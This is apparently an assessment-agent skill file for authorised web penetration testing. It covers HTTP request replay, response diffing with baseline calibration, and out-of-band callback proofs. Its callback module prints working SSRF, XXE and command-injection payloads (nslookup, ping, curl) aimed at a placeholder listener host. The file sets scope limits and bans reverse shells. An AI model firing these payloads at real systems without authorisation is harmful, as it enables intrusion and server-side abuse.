---
name: traffic_manipulation
description: Use when replaying or editing captured raw HTTP requests, when diffing
  two server responses to detect subtle behavioral changes or blind flaws, or when
  planting out-of-band (OOB) DNS/HTTP callbacks to prove blind SSRF, XXE, or asynchronous
  command injection.
---

# Traffic manipulation harness (P3)

The harness every later phase leans on: raw request replay, structured
response diffing, and the OOB callback listener. Nothing past P3 runs
until it works.

## The way

- One variable per replay; every request file carries its auth-context
  label — an unlabeled request is not evidence. Never edit an evidence
  original.
- A delta is only a delta against a stable baseline: A/A calibration
  first; whatever moves A/A is noise for that endpoint and gets excluded.
- Cache-bust both arms; normalize volatile fields (timestamps, nonces,
  request ids) before hashing.
- Timing is medians over N >= 5 with the warm-up dropped, never single
  shots.
- Blind classes are proved by effect: one unique canary subdomain per
  probe, 1:1 with the probe id. A callback proves the sink reached out —
  check source, timing and uniqueness before granting D1.
- "No response" is never "probably vulnerable". Give async sinks a
  >= 10 minute patience window and record it either way.

## Handoffs

Canary-confirmed blind SSRF/XXE/async-cmdi -> `40`/`45`; role and
behavior deltas -> `30`/`58`; every D2 -> `90`.

## Tools

`req_replay.py` (guarded — validates the final Host against scope before
any socket), `resp_diff.py` (offline). Interactsh-style listener, domain
via env. Diff dimensions and OOB payload-placement families in
`references/`.

---

## Reference Module: `diffing-baselines`

# Diffing and baselines: dimensions, noise control, A/A calibration

How `resp_diff.py`-style comparison turns into claims that survive D2.

## Diff dimension checklist

| Dimension | How measured | Noise risk | Normalization |
|---|---|---|---|
| Status code + reason | status line of both responses | rare | none |
| Body size | byte length of body | ads/dynamic content | compare only after A/A stability |
| Headers-of-interest | `Location`, `Set-Cookie` (names + attributes), `Content-Type`, `Cache-Control`, `Retry-After`, `WWW-Authenticate`, `Allow`, rate-limit headers | cookie rotation, request ids | mask volatile values; compare names/attributes exactly |
| Body sha256 | hash of body after normalization | timestamps, CSRF tokens, nonces | regex-mask volatile fields before hashing |
| DOM delta (HTML) | normalized text or DOM (scripts/styles stripped, whitespace collapsed) | A/B flags, bot checks | normalize, then hash |
| Timing | median over N >= 5 per arm | GC, cache warm-up, jitter | discard first run; medians, not means |
| Header set delta | header names present in one but not the other | proxies adding hop headers | ignore hop-by-hop (`Connection`, `Via`, `X-Forwarded-*` added by proxies) unless the claim is about them |

Header values that are volatile by design and masked before comparison:
`Date`, `ETag`, `Set-Cookie` values, `X-Request-Id`/request ids,
`Age`, `NF-Request-ID`-style CDN ids.

## Noise control

1. Cache-busting: add a fresh nonce param (`rjpt=<nonce>`) to BOTH arms
   whenever the compared dimension is status/body/size; never only to one.
2. Session hygiene: same auth context within an A/B pair; tokens refreshed
   between runs must be re-validated (a 401 delta is a session artifact,
   not a finding).
3. WAF/normalization awareness: some stacks normalize payloads before the
   handler sees them — a null delta with a known-active sink is recorded as
   "normalized/blackholed", not "not vulnerable".
4. One variable per pair: payload vs no-payload, role-a vs role-b — never
   two edits at once.
5. Bot detection/A-B flags: if A/A runs disagree wildly, the endpoint is
   unsuitable for black-box diffing; note it and move on (dead-end rule).

## A/A calibration procedure

Run before trusting ANY dimension on a new endpoint:

1. Send the identical request twice (fresh cache-buster nonce each time).
2. Diff the pair with `resp_diff.py`.
3. Any dimension that differs in A/A is a noise dimension for this
   endpoint: record it in the run notes and exclude it from claims.
4. Run one more A/A (3 total) — a dimension that moved in run 1 but not 2-3
   is flaky; treat as noise.
5. Only dimensions stable across all A/A runs may support a finding.

Example output to keep (run notes):

```text
endpoint /api/v1/invoices  A/A: size delta 0, status delta 0,
timing median 118ms/121ms (stable), set-cookie value rotates (masked) ->
claimable dims: status, size, body-hash(normalized), timing(median)
```

## Timing protocol (blind/time-based claims)

1. N >= 5 samples per arm, interleaved (A,B,A,B,...) to spread load drift.
2. Discard each arm's first sample (warm-up).
3. Compare medians; report both medians and the spread (min/max or IQR).
4. Claim a timing delta only when median difference exceeds the arms'
   observed spread (rule of thumb: > 2x the larger spread).
5. Never claim from a single-shot delay; re-run the whole protocol for D2.

## Decision table: what a delta suggests

| Delta pattern | First interpretation | Handoff |
|---|---|---|
| Status + `Location` differ | redirect/logic branch taken | `55` (open redirect) or `30` (authz branch) |
| Body hash/size differ, status same | content divergence; open first-divergent line in `resp_diff.py` output | classify by content |
| Only `Set-Cookie` attributes differ | session-flag difference (HttpOnly/Secure/SameSite) | `30` |
| Only headers-of-interest differ | config/feature behavior difference | `50` or `58` |
| Timing-only delta (after median protocol) | blind/time-based candidate | `40` with OOB pairing |
| Identical everywhere | null result; log it (coverage statement) | none |


---

## Reference Module: `oob-callbacks`

# OOB callbacks: payload families, canary placement, correlation

Out-of-band methodology for blind sinks. Documentation domains only:
`oob.example.com` stands in for the engagement listener domain (arrives via
`REDJOHN_OOB_DOMAIN`), `target.example.com` for the target.

## Listener setup checklist

1. Start the Interactsh-style client inside the RedJohn assessment
   container; session key via env, never the command line.
2. Export the listener domain (`REDJOHN_OOB_DOMAIN=<...>`).
3. Self-check: generate one canary yourself, trigger it from the container,
   confirm it appears in polling. Only then trust the pipeline.
4. Record session start time and the polling cadence (15-30s) in the run
   notes.

## Canary placement rules

- Format: `<nonce>.<engagement-tag>.<listener-domain>`, nonce unique per
  probe (1 probe = 1 canary, never reused). Canary strings overall follow
  `rj-pt-<engagement>-<nonce>`.
- Place the canary as deep in the sink as the sink allows: inside the
  fetched URL's host for SSRF, inside the entity URI for XXE, inside the
  resolver argument for command injection.
- Keep one payload family per probe; compound probes destroy attribution.

## Payload families per blind class

### Blind SSRF (URL-fetching sinks)

```text
param.url = http://<nonce>.oob.example.com/ssrf-probe
param.url = http://<nonce>.oob.example.com:8080/port-probe   # port signal
param.image = //<nonce>.oob.example.com/i                     # protocol-relative
param.hook = http://<nonce>.oob.example.com/h?t=<secret-lead> # NEVER real data in the query
```

- DNS-first: a bare hostname in the param catches parsers that only
  resolve; the HTTP path variant catches full fetches.
- Internal-range probing (169.254.169.254, 10.0.0.0/8) is out of bounds
  unless the engagement scope explicitly includes those ranges.

### Blind XXE (XML-parsing sinks)

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://<nonce>.oob.example.com/xxe"> ]>
<r>&xxe;</r>
```

- Parameter-entity variant (when direct entity eval is blocked):
  `<!DOCTYPE r [ <!ENTITY % dtd SYSTEM
  "http://<nonce>.oob.example.com/x.dtd"> %dtd; ]>` — the DTD fetch itself
  is the callback.
- Correlate on DNS + HTTP; a DNS hit without HTTP still proves entity
  resolution.

### Async command injection (documented, benign proofs only)

```text
; nslookup <nonce>.oob.example.com
& ping -c 1 <nonce>.oob.example.com
| curl -s http://<nonce>.oob.example.com/cmd
`nslookup <nonce>.oob.example.com`   (backtick eval contexts)
```

- Resolution proofs only (`nslookup`, `ping -c 1`, `curl` GET). Marker
  echo proofs (`id`, `whoami`, `hostname`) require an in-band or
  exfil-to-listener channel and stay within master impact rules; no
  reverse shells, no destructive commands, ever.

### Other blind classes (listener-supported, owned elsewhere)

- Blind redirect/open-redirect chains: `next=http://<nonce>.oob.example.com/`
  (interaction proves redirect followed server-side; client-side redirect
  proof belongs to `55`).
- Blind SQLi DNS exfil: only with explicit engagement authorization
  (`40-injection-engine` owns payloads; this skill owns the listener).

## Callback-to-probe correlation table

Maintain per engagement (this exact column set):

```text
| probe_id | evidence file              | class  | canary FQDN                  | sent_at  | first_cb | cb_source  | proto | verdict |
|----------|----------------------------|--------|------------------------------|----------|----------|------------|-------|---------|
| p5-014   | evidence/p5-ssrf-014.req.txt | ssrf   | 4f2a91.p3.oob.example.com    | 10:31:04 | 10:31:07 | 203.0.113.9 | http  | hit     |
| p5-015   | evidence/p5-xxe-015.req.txt | xxe    | 7b1c03.p3.oob.example.com    | 10:33:12 | -        | -           | -     | pending |
```

Verdict values: `hit`, `pending` (inside patience window), `negative`
(window elapsed), `false-positive` (rules below).

## False-positive callback rules

1. Canary uniqueness: a hit on a canary that was ever sent anywhere else is
   void — re-probe with a fresh nonce.
2. Source check: corporate link scanners, mail gateways and preview proxies
   prefetch URLs. A callback from an address that is not the target's
   egress (e.g., a scanner range) does not prove the target fetched it;
   corroborate with timing.
3. Timing correlation: the first callback should trail the probe by a
   plausible margin (seconds for direct sinks; within the patience window
   for queued ones). Random-hour-later hits are logged, not claimed.
4. Scope of claim: a callback proves the sink performed DNS/HTTP toward the
   listener. It does not by itself prove arbitrary-file read, data
   exfiltration or command output — state exactly what was demonstrated and
   hand the rest to `40`/`45` for in-band confirmation.

## Patience windows and cadence

| Class | Poll cadence | Minimum patience before `negative` |
|---|---|---|
| Direct SSRF/XXE fetch | 15s | 2 minutes |
| Async job/queue command injection | 30s | 10 minutes |
| Email/SMS/webhook-triggered paths | 60s | engagement-defined (record it) |

Log the window used for every negative verdict; a pending probe is never
silently dropped.

